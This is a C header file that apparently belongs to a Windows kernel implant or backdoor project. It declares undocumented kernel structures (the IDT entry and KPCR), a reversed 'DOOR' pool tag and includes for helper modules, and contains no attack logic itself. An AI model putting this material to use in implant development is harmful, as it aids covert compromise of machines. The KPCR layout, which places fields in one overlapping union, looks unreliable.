/********************************************************
 * 
 * (C) COPYRIGHT AUTHORS, 2020
 *
 * TITLE:	COMMON.H
 *
 * VERSION:	1.0
 *
 * DATE:	APRIL 06 2020
 *
 * Common undocumented structure definitions / headers for
 * the implant.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED 
 * TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A 
 * PARTICULAR PURPOSE.
 *
*********************************************************/
#pragma once

#define PTR_V(x) ((ULONG_PTR)x)
#define ALLOC_TAG 0x524f4f44 // 'DOOR'[::-1]

#if defined(_M_X86)
#error Currently does not support x86 targets
#endif

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#include "hash.h"
#include "kutil.h"
#include "peutil.h"
#include "hashes.h"

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool
} POOL_TYPE;

typedef union _KIDTENTRY64
{
	union
	{
		struct 
		{
			unsigned short OffsetLow;
			unsigned short Selector;
			struct 
			{
				unsigned short IstIndex : 3;
				unsigned short Reserved0 : 5;
				unsigned short Type : 5;
				unsigned short Dpl : 2;
				unsigned short Present : 1;
			};
			unsigned short OffsetMiddle;
			unsigned long OffsetHigh;
			unsigned long Reserved1;
		};
		unsigned long long Alignment;
	};
} KIDTENTRY64, *PKIDENTRY64;

typedef struct _KPCR
{
	union
	{
		struct _NT_TIB NtTib;
		struct 
		{
			void *GdtBase;
			void *TssBase;
			unsigned long long UserRsp;
			struct _KPCR *SelfPcr;
			void *CurrentPcrb;
			void *LockArray;
			void *Used_Self;
		};
		union _KIDTENTRY64 *IdtBase;
		unsigned long long Unused[2];
		unsigned char Irql;
	};
} KPCR, *PKPCR;
